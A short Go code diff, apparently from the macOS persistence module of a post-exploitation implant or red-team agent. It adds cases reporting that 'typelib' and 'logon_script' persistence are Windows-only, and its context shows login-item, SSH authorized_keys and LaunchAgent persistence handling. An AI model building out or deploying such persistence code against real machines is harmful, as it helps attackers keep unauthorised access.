@@ -1126,6 +1126,8 @@ func applyPersistence(method string, args string) string {
 			return fmt.Sprintf("persistence: login item failed: %v\n%s", err, string(out))
 		}
 		return "persistence: login item added"
+	case "typelib", "logon_script":
+		return "persistence: " + method + " is a Windows-only method"
 	default:
 		if err := addPersistenceDarwin(); err != nil {
 			return fmt.Sprintf("persistence: unknown method '%s': %s", method, err.Error())
@@ -1224,6 +1226,8 @@ func removePersistence(method string, args string) string {
 			return "persistence: SSH key removed from authorized_keys"
 		}
 		return "persistence: specify key fragment to remove"
+	case "typelib", "logon_script":
+		return "persistence: " + method + " is a Windows-only method"
 	default:
 		removePersistenceDarwin()
 		return "persistence: macOS entries removed (LaunchAgent)"
